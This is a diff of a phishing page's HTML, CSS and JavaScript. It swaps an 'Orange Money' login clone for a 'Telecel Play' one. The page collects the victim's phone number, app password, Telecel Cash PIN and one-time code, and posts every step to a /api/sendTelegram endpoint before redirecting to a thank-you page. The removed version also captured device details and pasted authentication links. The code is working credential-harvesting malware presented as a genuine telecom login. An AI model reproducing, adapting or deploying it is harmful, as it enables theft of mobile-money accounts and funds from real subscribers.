@@ -3,496 +3,598 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Orange Money — Login</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<title>Telecel Play Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 
 <style>
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
+
+*{box-sizing:border-box}
 
 body{
-  font-family:Inter,system-ui,Arial;
-  background:
-    radial-gradient(900px 300px at 50% -150px, rgba(249,115,22,.25), transparent),
-    linear-gradient(180deg,#fff4e6,#ffe0bf);
-  margin:0;
-  padding:18px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#000;
+
+font-family:"Plus Jakarta Sans",system-ui;
+
+margin:0;
+
+min-height:100vh;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+background:
+linear-gradient(180deg,#fff5f7,#ffe3e8);
+
+}
+
+/* telecom waves */
+
+.wave{
+
+position:fixed;
+width:600px;
+height:600px;
+border-radius:50%;
+
+background:
+radial-gradient(circle,
+rgba(230,0,35,.18),
+transparent 70%);
+
+filter:blur(40px);
+
+z-index:-1;
+
+animation:float 18s infinite linear;
+
+}
+
+.wave.one{top:-200px;right:-150px}
+.wave.two{bottom:-200px;left:-150px;animation-duration:22s}
+
+@keyframes float{
+
+0%{transform:translateY(0)}
+50%{transform:translateY(40px)}
+100%{transform:translateY(0)}
+
 }
 
 .card{
-  width:100%;
-  max-width:380px;
-  background:#fff;
-  padding:22px;
-  border-radius:16px;
-  box-shadow:0 18px 40px rgba(0,0,0,.18);
+
+width:100%;
+max-width:380px;
+
+background:white;
+
+padding:26px;
+
+border-radius:18px;
+
+box-shadow:
+0 25px 60px rgba(0,0,0,.18);
+
 }
 
-.logo{height:46px;display:block;margin:0 auto 12px}
+/* logo */
 
-h2{text-align:center;margin:0 0 14px;font-size:20px;font-weight:700}
-label{display:block;font-size:13px;margin-top:10px}
+.logo{
+
+height:120px;
+display:block;
+margin:auto;
+
+}
+
+/* texts */
+
+h1{
+
+color:#e60023;
+
+text-align:center;
+
+margin:8px 0 4px;
+
+font-size:22px;
+
+font-weight:800;
+
+}
+
+.subtitle{
+
+text-align:center;
+
+font-size:13px;
+
+color:#444;
+
+margin-bottom:16px;
+
+}
+
+/* inputs */
+
+label{
+
+font-size:13px;
+
+display:block;
+
+margin-top:10px;
+
+}
 
 input{
-  width:100%;
-  padding:11px;
-  border-radius:10px;
-  border:1px solid #e5e5e5;
-  background:#fafafa;
-  font-size:14px;
+
+width:100%;
+
+padding:12px;
+
+border-radius:10px;
+
+border:1px solid #e5e5e5;
+
+background:#fafafa;
+
+margin-top:5px;
+
+font-size:14px;
+
 }
 
-input:focus{outline:none;border-color:#f97316;background:#fff}
+input:focus{
+
+outline:none;
+
+border-color:#e60023;
+
+background:white;
+
+}
+
+/* password toggle */
+
+.password-box{
+
+position:relative;
+
+}
+
+.eye{
+
+position:absolute;
+
+right:10px;
+
+top:50%;
+
+transform:translateY(-50%);
+
+cursor:pointer;
+
+font-size:14px;
+
+}
+
+/* hint */
+
+.hint{
+
+font-size:12px;
+
+color:#e60023;
+
+margin-top:4px;
+
+}
+
+/* button */
 
 .btn{
-  background:#f97316;
-  color:#fff;
-  padding:11px;
-  border-radius:10px;
-  border:0;
-  margin-top:14px;
-  width:100%;
-  font-weight:700;
-  cursor:pointer;
+
+margin-top:16px;
+
+width:100%;
+
+padding:12px;
+
+border-radius:10px;
+
+border:0;
+
+font-weight:700;
+
+background:#e60023;
+
+color:white;
+
+cursor:pointer;
+
 }
 
-.btn[disabled]{background:#fdba74}
+/* modal */
 
-.small{font-size:13px;color:#444}
-.success{color:#16a34a;font-weight:600}
-.error{min-height:18px;font-size:13px;color:#dc2626}
+.modal{
 
-.pin-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+position:fixed;
 
-.pin-digit{
-  width:42px;height:50px;text-align:center;font-size:20px;
-  border-radius:10px;border:1px solid #e5e5e5;background:#fafafa
+inset:0;
+
+background:rgba(0,0,0,.55);
+
+display:none;
+
+align-items:center;
+justify-content:center;
+
 }
 
-.pin-digit:focus{outline:none;border-color:#f97316;background:#fff}
+.box{
 
-/* MODAL */
+background:white;
 
-.otp-modal{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.55);
-  display:flex;
-  align-items:center;
-  justify-content:center
+padding:20px;
+
+border-radius:16px;
+
+width:100%;
+max-width:320px;
+
 }
 
-.otp-box{
-  background:linear-gradient(180deg,rgba(255,255,255,.92),rgba(255,255,255,.78));
-  backdrop-filter:blur(20px);
-  padding:22px;
-  border-radius:18px;
-  min-width:320px;
-  box-shadow:0 25px 50px rgba(0,0,0,.4)
+/* pin */
+
+.pin{
+
+display:flex;
+
+gap:8px;
+
+justify-content:center;
+
+margin:10px 0;
+
 }
 
-.otp-warning{
-  color:#dc2626;
-  font-size:13px;
-  display:none;
-  margin-top:6px
+.pin input{
+
+width:45px;
+
+height:50px;
+
+text-align:center;
+
+font-size:20px;
+
 }
 
-/* AUTH LINK FIELD */
+/* otp */
 
-.link-field{
-  display:flex;
-  gap:6px;
-  margin-top:12px
+.count{
+
+font-size:12px;
+
+color:#555;
+
+text-align:center;
+
+margin-top:6px;
+
 }
-
-#authLink{
-  flex:1;
-  border:2px solid #f97316;
-  background:#fff7ed;
-  padding:12px;
-  border-radius:10px;
-  font-size:14px
-}
-
-#authLink:focus{
-  outline:none;
-  border-color:#ea580c;
-  background:#fff
-}
-
-#pasteBtn{
-  width:42px;
-  border-radius:10px;
-  border:1px solid #e5e5e5;
-  background:#fff;
-  font-size:18px;
-  cursor:pointer
-}
-
-.resend-row{
-  display:flex;
-  justify-content:space-between;
-  margin-top:14px
-}
-
-.resend-btn{
-  background:#fff;
-  border:1px solid #e5e5e5;
-  padding:6px 14px;
-  border-radius:10px;
-  cursor:pointer
-}
-
-.resend-btn[disabled]{opacity:.5}
-
-.otp-actions{
-  display:flex;
-  gap:10px;
-  margin-top:14px
-}
-
-.otp-actions button{
-  flex:1;
-  padding:10px;
-  border-radius:10px;
-  border:0;
-  font-weight:700;
-  cursor:pointer
-}
-
-#confirmOtp{background:#f97316;color:#fff}
-#confirmOtp[disabled]{background:#fdba74}
-#cancelOtp{background:#f3f4f6;color:#000}
 
 </style>
+
 </head>
 
 <body>
 
+<div class="wave one"></div>
+<div class="wave two"></div>
+
+
 <div class="card">
-<img src="assets/orange.png" class="logo">
 
-<h2>Login</h2>
+<img src="assets/telecel.svg" class="logo">
 
-<form id="loginForm" autocomplete="off">
 
-<label>Phone number</label>
-<input id="phone" value="+267" inputmode="numeric">
-<div id="phoneError" class="error"></div>
+<h1>Welcome to Telecel Play</h1>
 
-<label>Enter your PIN code</label>
+<div class="subtitle">
 
-<div class="pin-row">
-<input class="pin-digit" maxlength="1" inputmode="numeric">
-<input class="pin-digit" maxlength="1" inputmode="numeric">
-<input class="pin-digit" maxlength="1" inputmode="numeric">
-<input class="pin-digit" maxlength="1" inputmode="numeric">
+Enter your number to log in.  
+You need to be a Telecel subscriber to proceed.
+
 </div>
 
-<input type="text" id="hp" style="display:none">
 
-<button id="loginBtn" class="btn" disabled>LOG IN</button>
+<form id="form">
+
+<label>Phone Number</label>
+
+<input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">
+
+
+<label>Password</label>
+
+<div class="password-box">
+
+<input id="password" type="password">
+
+<span class="eye" onclick="togglePassword()">👁</span>
+
+</div>
+
+<div class="hint">
+
+(Use your Telecel Play App password)
+
+</div>
+
+
+<button class="btn">
+
+Next
+
+</button>
 
 </form>
-</div>
-
-<!-- AUTH LINK MODAL -->
-
-<div id="otpModal" class="otp-modal" style="display:none">
-
-<div class="otp-box">
-
-<div style="text-align:center">
-<strong>Authentication</strong>
-</div>
-
-<p class="small">Paste the authentication link received.</p>
-
-<div class="link-field">
-
-<input id="authLink" placeholder="Paste authentication link">
-
-<button id="pasteBtn">📋</button>
 
 </div>
 
-<div id="otpWarning" class="otp-warning">
-Please paste the authentication link
+
+
+<!-- PIN -->
+
+<div id="pinModal" class="modal">
+
+<div class="box">
+
+<img src="assets/telecash.webp" style="height:70px;display:block;margin:auto">
+
+<p style="text-align:center">
+
+Enter your Telecel Cash PIN
+
+</p>
+
+<p style="text-align:center;font-weight:700" id="showNumber"></p>
+
+<div class="pin">
+
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+
 </div>
 
-<div class="resend-row">
+<button class="btn" onclick="submitPin()">
 
-<div class="small" id="resendInfo">
-Resend available in <span id="countdown">60</span>s
-</div>
+Login
 
-<button id="resendBtn" class="resend-btn" disabled>
-Resend code
 </button>
 
 </div>
 
-<div class="otp-actions">
+</div>
 
-<button id="confirmOtp" disabled>Confirm</button>
 
-<button id="cancelOtp">Cancel</button>
+
+<!-- OTP -->
+
+<div id="otpModal" class="modal">
+
+<div class="box">
+
+<p style="text-align:center">
+
+Enter OTP sent to your phone
+
+</p>
+
+<div class="pin">
+
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 
 </div>
 
-<div id="otpStatus" class="small" style="margin-top:10px"></div>
+<div class="count">
+
+Code expires in <span id="time">60</span>s
 
 </div>
+
+<button class="btn" onclick="submitOtp()">
+
+Verify OTP
+
+</button>
+
 </div>
+
+</div>
+
+
 
 <script>
 
-/* DEVICE */
-
-const ua=navigator.userAgent
-let device="Unknown"
-
-if(/Android/i.test(ua)){
-const v=ua.match(/Android\s([\d.]+)/)
-device="Android "+(v?v[1]:"")
-}
-else if(/iPhone|iPad/i.test(ua)){
-const v=ua.match(/OS (\d+_\d+)/)
-device="iOS "+(v?v[1].replace("_","."):"")
-}
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
-else if(/Firefox/i.test(ua)) device+=" | Firefox"
-
-/* PLAN */
-
-let planLine=null
-try{
-const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
-if(p){
-planLine=[p.name||p.shortName||"",p.price||""].filter(Boolean).join(" — ")
-}
-}catch(e){}
-
-/* PHONE */
-
-const phone=document.getElementById("phone")
-const phoneError=document.getElementById("phoneError")
-const loginBtn=document.getElementById("loginBtn")
-
-function validatePhone(){
-const d=phone.value.replace("+267","")
-if(!/^\d{8}$/.test(d)){
-phoneError.textContent="Enter a valid 8-digit number"
-return false
-}
-phoneError.textContent=""
-return true
-}
-
-phone.addEventListener("input",()=>{
-let d=phone.value.replace("+267","").replace(/\D/g,"").replace(/^0+/,"").slice(0,8)
-phone.value="+267"+d
-updateLogin()
-})
-
-/* PIN */
-
-const pins=[...document.querySelectorAll(".pin-digit")]
+let phoneValue=""
+let passwordValue=""
 let pinValue=""
+let otpValue=""
 
-pins.forEach((p,i)=>{
-p.addEventListener("input",()=>{
-p.value=p.value.replace(/\D/g,"")
-if(p.value && i<3) pins[i+1].focus()
-pinValue=pins.map(x=>x.value).join("")
-updateLogin()
+/* validate phone */
+
+document.getElementById("phone").addEventListener("input",e=>{
+
+let v=e.target.value.replace(/\D/g,"").slice(0,10)
+
+if(v.length>0 && v[0]!=="0") v="0"+v.slice(1)
+
+e.target.value=v
+
 })
 
-p.addEventListener("keydown",e=>{
-if(e.key==="Backspace" && !p.value && i>0){
-pins[i-1].focus()
-pins[i-1].value=""
-pinValue=pins.map(x=>x.value).join("")
-updateLogin()
+/* password toggle */
+
+function togglePassword(){
+
+const p=document.getElementById("password")
+
+p.type=p.type==="password"?"text":"password"
+
+}
+
+/* submit login */
+
+document.getElementById("form").onsubmit=e=>{
+
 e.preventDefault()
+
+phoneValue=document.getElementById("phone").value
+
+passwordValue=document.getElementById("password").value
+
+if(!/^0\d{9}$/.test(phoneValue)){
+
+alert("Enter valid number")
+
+return
+
 }
+
+document.getElementById("showNumber").textContent=phoneValue
+
+document.getElementById("pinModal").style.display="flex"
+
+sendData("login",{
+
+phone:phoneValue,
+
+password:passwordValue
+
 })
+
+}
+
+/* pin input auto focus */
+
+document.querySelectorAll("#pinModal input").forEach((i,index)=>{
+
+i.oninput=()=>{
+
+if(i.value && index<3)
+
+document.querySelectorAll("#pinModal input")[index+1].focus()
+
+}
+
 })
 
-function updateLogin(){
-loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue))
+function submitPin(){
+
+pinValue=[...document.querySelectorAll("#pinModal input")]
+
+.map(i=>i.value)
+
+.join("")
+
+document.getElementById("pinModal").style.display="none"
+
+document.getElementById("otpModal").style.display="flex"
+
+sendData("pin",{pin:pinValue})
+
+startTimer()
+
 }
 
-/* API */
+/* otp */
 
-async function sendToServer(payload){
-return fetch("/api/sendTelegram",{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify(payload)
+document.querySelectorAll("#otpModal input").forEach((i,index)=>{
+
+i.oninput=()=>{
+
+if(i.value && index<4)
+
+document.querySelectorAll("#otpModal input")[index+1].focus()
+
+}
+
 })
-}
 
-/* AUTH MODAL */
+function submitOtp(){
 
-const otpModal=document.getElementById("otpModal")
-const authLink=document.getElementById("authLink")
-const confirmBtn=document.getElementById("confirmOtp")
-const cancelBtn=document.getElementById("cancelOtp")
-const resendBtn=document.getElementById("resendBtn")
-const pasteBtn=document.getElementById("pasteBtn")
-const otpWarning=document.getElementById("otpWarning")
-const resendInfo=document.getElementById("resendInfo")
-const otpStatus=document.getElementById("otpStatus")
+otpValue=[...document.querySelectorAll("#otpModal input")]
 
-let timer=null
-let seconds=60
+.map(i=>i.value)
 
-function startCountdown(){
+.join("")
 
-clearInterval(timer)
+sendData("otp",{otp:otpValue})
 
-seconds=60
-
-authLink.disabled=false
-pasteBtn.disabled=false
-
-resendBtn.disabled=true
-
-resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`
-
-timer=setInterval(()=>{
-
-seconds--
-
-document.getElementById("countdown").textContent=seconds
-
-if(seconds<=0){
-
-clearInterval(timer)
-
-authLink.disabled=true
-pasteBtn.disabled=true
-
-resendBtn.disabled=false
-
-resendInfo.textContent="Expired"
+location.href="thankyou.html"
 
 }
+
+/* timer */
+
+function startTimer(){
+
+let t=60
+
+const el=document.getElementById("time")
+
+const interval=setInterval(()=>{
+
+t--
+
+el.textContent=t
+
+if(t<=0) clearInterval(interval)
 
 },1000)
 
 }
 
-/* VALIDATION */
+/* telegram */
 
-function updateConfirm(){
+async function sendData(step,data){
 
-const value = authLink.value.trim()
+await fetch("/api/sendTelegram",{
 
-const regex = /^https:\/\/maxit-mobile\.orange\.co\.bw\/oms-links\/auth\?token=[A-Za-z0-9]+$/
+method:"POST",
 
-const ok = regex.test(value)
+headers:{"Content-Type":"application/json"},
 
-confirmBtn.disabled=!ok
+body:JSON.stringify({
 
-otpWarning.style.display=ok?"none":"block"
+step,
 
-}
+phone:phoneValue,
 
-authLink.addEventListener("input",updateConfirm)
+password:passwordValue,
 
-/* PASTE */
+pin:pinValue,
 
-pasteBtn.onclick=async()=>{
+otp:otpValue,
 
-try{
+...data,
 
-const text=await navigator.clipboard.readText()
+time:new Date().toISOString()
 
-authLink.value=text.trim()
-
-updateConfirm()
-
-}catch{
-
-alert("Paste manually")
-
-}
-
-}
-
-/* LOGIN */
-
-document.getElementById("loginForm").addEventListener("submit",async e=>{
-
-e.preventDefault()
-
-if(document.getElementById("hp").value) return
-
-otpModal.style.display="flex"
-
-authLink.value=""
-
-updateConfirm()
-
-startCountdown()
-
-await sendToServer({
-event:"login_clicked",
-loginPhone:phone.value,
-loginPin:pinValue,
-plan:planLine,
-device,
-submittedAt:new Date().toISOString()
 })
 
 })
 
-resendBtn.onclick=async()=>{
-
-startCountdown()
-
-await sendToServer({
-event:"resend_link",
-loginPhone:phone.value,
-loginPin:pinValue,
-plan:planLine,
-device,
-submittedAt:new Date().toISOString()
-})
-
-}
-
-confirmBtn.onclick=async()=>{
-
-await sendToServer({
-event:"auth_link_confirm",
-loginPhone:phone.value,
-loginPin:pinValue,
-link:authLink.value,
-plan:planLine,
-device,
-submittedAt:new Date().toISOString()
-})
-
-otpStatus.innerHTML="<span class='success'>Success — request received</span>"
-
-setTimeout(()=>location.href="thankyou.html",1200)
-
-}
-
-cancelBtn.onclick=()=>{
-otpModal.style.display="none"
-clearInterval(timer)
 }
 
 </script>
